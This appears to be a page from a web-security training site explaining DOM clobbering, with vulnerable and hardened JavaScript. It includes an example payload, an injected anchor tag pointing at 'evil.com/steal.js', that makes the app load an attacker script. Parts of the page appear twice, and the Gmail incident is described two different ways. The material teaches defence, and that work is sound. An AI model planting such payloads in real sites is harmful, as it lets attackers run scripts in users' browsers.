DOM Clobbering (Logic Collision)

Script-free, benign HTML elements clobber global JavaScript namespaces, corrupting application logic to unlock unauthorized functionality.

Sandbox Defense Controller

● Vulnerable Mode Active — Unchecked global property trust

SECTION 01

What it is

DOM Clobbering is a naming collision vulnerability where benign HTML elements (such as forms or anchors with specific id and name attributes) create unexpected window-scoped objects. When scripts expect an uninitialized variable to be undefined or boolean, the clobbered DOM element overrides it, corrupting conditional checks without executing scripts.

role-manager.js (Hardened) STRICT TYPE CHECK ENFORCED 
1const SAFE_STATE = Object.freeze({ isAdmin: false });
2function isLegitimateBoolean(val) {
3  // Deny values that are HTMLElement or not primitive booleans
4  return typeof val === "boolean" && !(val instanceof HTMLElement);
5}
6function renderControlCenter() {
7  if (isLegitimateBoolean(SAFE_STATE.isAdmin) && SAFE_STATE.isAdmin === true) {
8    showRestrictedAdminPanel();

Highlighted Lines 3–4 & 7: Primitive type-checking ensures DOM nodes cannot satisfy logic conditions.
SECTION 04

Why it matters

DOM Clobbering slips past sanitizers that only strip script tags. By collision with global identifiers, attackers disable defenses, manipulate routing, or unlock hidden admin features.

Real-World Incident: In Google Gmail, researchers bypassed HTML sanitization via DOM clobbering by naming form elements to overwrite core prototype methods, forcing an unsafe execution path.

DOM Clobbering

CWE-79 OWASP A03:2021 — Injection
← Open Redirect Back to Home

1 What It Is

Browsers have a legacy behavior: any HTML element with an id attribute automatically becomes accessible as a property on the window object. For example, <img id="banner"> creates window.banner pointing to that element.

DOM Clobbering exploits this. If an attacker can inject HTML into the page (even through a sanitizer that blocks <script> tags), they can create an element whose id matches a variable name the app relies on. The browser then overwrites ("clobbers") that variable with the DOM element, hijacking the application's logic.

This attack does not require injecting JavaScript — just plain HTML with the right id or name attributes.

2 How the Attack Works — Step by Step

Step 1 — The injection point

Many web apps allow some user HTML — comment sections, rich-text editors, email renderers, or CMS widgets. These features usually run through a sanitizer that strips <script> tags, onerror attributes, and javascript: URLs. But most sanitizers allow id and name attributes because they seem harmless.

user-comment.html — where HTML gets injected 
<!-- The app renders user-submitted HTML here -->
<div class="comment-body">

  <!-- Sanitizer allows this — no scripts, just an <a> tag -->
  <a id="defaultURL" href="https://evil.com/steal.js"></a>

</div>

The injected <a> tag looks innocent. No script, no event handler. The sanitizer lets it through.

Step 2 — The browser creates a global variable

Per the HTML spec, the browser now creates window.defaultURL pointing to that <a> element. This is automatic — no JavaScript needed. If any code later reads window.defaultURL, it gets the DOM element instead of undefined (or whatever the developer expected).

browser console — before vs. after injection 
// BEFORE the malicious comment is posted:
console.log(window.defaultURL);  // → undefined

// AFTER the <a id="defaultURL" ...> is in the DOM:
console.log(window.defaultURL);  // → <a> element
console.log(window.defaultURL.href);
// → "https://evil.com/steal.js"

Step 3 — The app reads the clobbered value

The app's JavaScript uses a common fallback pattern: window.X || "default". Because the <a> element is truthy, the || fallback is never reached. The app now uses the attacker's value.

app.js — the vulnerable code 
function loadAnalytics() {
  let url = window.defaultURL || "https://safe-cdn.com/a.js";
  // url is now the <a> element, NOT the safe string!

  let script = document.createElement('script');
  script.src = url;  // toString() → "https://evil.com/steal.js"
  document.head.appendChild(script);
  // ⚠️ Attacker's script is now loaded and executing!
}

Key insight: When an <a> element is used as a string (e.g., assigned to script.src), the browser calls .toString() on it, which returns its href — the attacker's URL.

Attack Flow Summary

① Attacker posts HTML with <a id="defaultURL" href="evil.com"> → ② Sanitizer allows it (no script tag) → ③ Browser creates window.defaultURL = the element → ④ App reads window.defaultURL || fallback → ⑤ Element is truthy, fallback skipped → attacker's URL is used.

4 Why It Matters

DOM Clobbering is dangerous precisely because it's subtle. It doesn't require <script> tags, so it bypasses most HTML sanitizers. An attacker can hijack configuration objects, redirect script loads to malicious URLs, or override security checks — all with elements that look harmless.

Real incident: In 2020, security researcher Michał Bentkowski reported a DOM Clobbering vulnerability in Gmail's AMP4Email implementation. By injecting HTML with specific id attributes, it was possible to bypass the AMP sandbox and achieve XSS in the Gmail context. Google awarded a bug bounty for this finding.

5 The Fix

Two defenses work together: declare variables in block scope (so the browser can't shadow them), and type-check any value read from window.

app-fixed.js 
// IIFE / module prevents global scope pollution
(function() {
  const DEFAULT_URL = "https://safe-cdn.com/a.js";

  function loadAnalytics() {
    let candidate = window.defaultURL;

    if (typeof candidate !== 'string') {
      candidate = DEFAULT_URL; // ← reject non-strings
    }

    let script = document.createElement('script');
    script.src = candidate;
    document.head.appendChild(script);
  }
})();

Why it works: typeof candidate !== 'string' catches clobbered values — DOM elements are objects, not strings. The const declaration in a closure ensures the fallback URL can't be clobbered. Even if window.defaultURL is an HTMLElement, the type check rejects it.
